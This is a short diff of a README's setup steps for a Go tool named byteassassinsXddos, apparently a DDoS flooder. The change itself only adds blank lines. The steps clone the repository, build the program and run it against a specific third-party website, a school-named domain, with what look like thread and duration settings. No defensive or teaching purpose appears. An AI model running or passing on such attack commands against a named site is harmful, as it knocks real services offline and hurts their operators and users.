@@ -27,8 +27,18 @@ setup=>👾
 
 
 step 1 >   git clone https://github.com/Sumitshah00/byteassassinsXddos.git
+
+
+
 step 2 >   cd byteassassinsXddos
+
+
+
 step 3 >   go build byteassassinsXddos.go
+
+
+
+
 step 4 >  ./byteassassinsXddos https://suratschool.metasofsda.in/ 5000 get 1200 nil
 
 
